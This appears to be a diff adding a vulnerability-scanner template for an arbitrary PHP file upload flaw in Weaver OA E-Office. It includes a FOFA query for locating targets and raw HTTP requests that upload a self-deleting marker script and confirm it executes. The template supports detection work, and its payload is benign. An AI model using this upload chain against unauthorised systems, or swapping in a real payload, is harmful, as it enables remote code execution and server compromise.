@@ -1,0 +1,56 @@
+id: weaver-jquery-file-upload
+
+info:
+  name: OA E-Office jQuery - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: Arbitrary File Upload in OA E-Office jQuery.
+  reference:
+    - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: app="泛微-EOffice"
+  tags: weaver,e-office,oa,instrusive,rce,intrusive
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  string: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        GET /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryjetvpuye
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo "{{string}}";unlink(__FILE__);?>
+        ------WebKitFormBoundaryjetvpuye--
+      - |
+        GET /attachment/{{attachmentID}}/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: attachmentID
+        internal: true
+        regex:
+          - "[0-9]{10}"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_3 == 200 && contains(body_3,'{{string}}')"
+        condition: and
+# digest: 490a004630440220790332461df03baf07989c298e9db35de0c2cb4167ab3fe056e411e36a9a0bb102207a458e4f016d324d92d1ec64d8f6cb99afd2e9cdbb5b304485c5d504bcfe1322:922c64590222798bb761d5b6d8e72950
